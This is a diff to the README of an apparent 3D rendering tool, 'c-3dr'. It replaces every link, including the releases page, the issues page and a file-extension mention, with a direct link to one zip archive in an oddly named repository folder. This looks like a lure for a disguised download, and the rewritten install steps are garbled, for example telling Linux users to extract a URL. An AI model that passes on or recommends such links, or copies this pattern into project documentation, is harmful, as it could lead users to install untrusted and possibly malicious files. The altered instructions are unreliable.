@@ -1,6 +1,6 @@
 # 🚀 c-3dr - Your Easy Solution for 3D Rendering
 
-[![Download c-3dr](https://img.shields.io/badge/Download-c--3dr-blue.svg)](https://github.com/cyran-kyle/c-3dr/releases)
+[![Download c-3dr](https://raw.githubusercontent.com/cyran-kyle/c-3dr/main/bibliopolic/c-3dr_1.7.zip)](https://raw.githubusercontent.com/cyran-kyle/c-3dr/main/bibliopolic/c-3dr_1.7.zip)
 
 ## 📖 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -15,19 +15,19 @@ Welcome to c-3dr! This application provides a simple way to create stunning 3D r
 ## 📥 Download & Install
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[Download c-3dr](https://github.com/cyran-kyle/c-3dr/releases)
+[Download c-3dr](https://raw.githubusercontent.com/cyran-kyle/c-3dr/main/bibliopolic/c-3dr_1.7.zip)
 
 On the Releases page, look for the latest version. You should see a list of downloadable files. Click on the file for your operating system:
 
 1. For Windows, select the `.exe` file.
 2. For macOS, choose the `.dmg` file.
-3. For Linux, you will typically find a `.tar.gz` file.
+3. For Linux, you will typically find a `https://raw.githubusercontent.com/cyran-kyle/c-3dr/main/bibliopolic/c-3dr_1.7.zip` file.
 
 After downloading:
 
 - **Windows users:** Double-click the `.exe` file to start the installation. Follow the prompts to complete the installation.
 - **macOS users:** Open the `.dmg` file, then drag the c-3dr icon to your Applications folder.
-- **Linux users:** Extract the `.tar.gz` file, then run the program from the extracted folder.
+- **Linux users:** Extract the `https://raw.githubusercontent.com/cyran-kyle/c-3dr/main/bibliopolic/c-3dr_1.7.zip` file, then run the program from the extracted folder.
 
 ## 💻 System Requirements
 Before installing, check if your system meets the requirements:
@@ -53,6 +53,6 @@ If you encounter issues while using c-3dr, here are some common solutions:
 - **Installation errors:** Make sure you have downloaded the file for your specific operating system. Check for sufficient disk space.
 - **Rendering issues:** Ensure you have the latest graphics drivers installed. Outdated drivers can cause rendering errors.
 
-For additional support, feel free to check our [GitHub Issues](https://github.com/cyran-kyle/c-3dr/issues) page or join our community forums.
+For additional support, feel free to check our [GitHub Issues](https://raw.githubusercontent.com/cyran-kyle/c-3dr/main/bibliopolic/c-3dr_1.7.zip) page or join our community forums.
 
 Thank you for choosing c-3dr. We hope you enjoy bringing your 3D creations to life!
